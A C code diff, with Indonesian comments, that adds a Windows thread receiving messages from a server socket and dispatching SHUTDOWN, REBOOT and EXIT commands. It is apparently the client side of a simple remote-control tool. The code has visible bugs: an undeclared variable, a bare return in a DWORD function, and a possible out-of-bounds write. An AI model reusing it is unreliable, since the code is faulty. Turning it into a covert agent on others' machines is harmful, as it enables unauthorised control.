@@ -332,3 +332,40 @@ void * getMessage (void * vParam){
 	return NULL;
 }
 #endif
+
+// FUNGSI UTAMA COMMAND
+# ifdef _WIN32
+#include "../target/command.h"
+
+
+DWORD WINAPI execMessage(LPVOID paramT){
+	if (paramT == NULL) return;
+
+	paramThread * param = (paramThread *)paramT;
+	char server_reply[1024] = {0};
+
+	box cmd;
+	inisialiasi(cmd);
+
+	addCommand("SHUTDOWN", (void *)SHUTDOWN, cmd);
+	addCommand("REBOOT", (void *)REBOOT, cmd);
+	addCommand("EXIT", (void *)EXIT, cmd);
+
+	while(1){
+		while((param)->socketStatus == 'c' || (param)->socketStatus == 's'){
+			recv_size = recv((param)->clientSocket, server_reply, sizeof(server_reply), 0);
+			if (recv_size == 0 || recv_size == SOCKET_ERROR) {
+				if((param)->socketStatus == 'c') (param)->socketStatus = 'x';
+				else (param)->socketStatus = 'X';
+				break;
+			} else {
+				proccess(server_reply, cmd);
+				server_reply[recv_size] = '\0';
+				printf("Server reply: %s\n", server_reply);
+				memset(server_reply, '\0', sizeof(server_reply));
+			}
+		}
+		Sleep(1000);
+	}
+}
+#endif
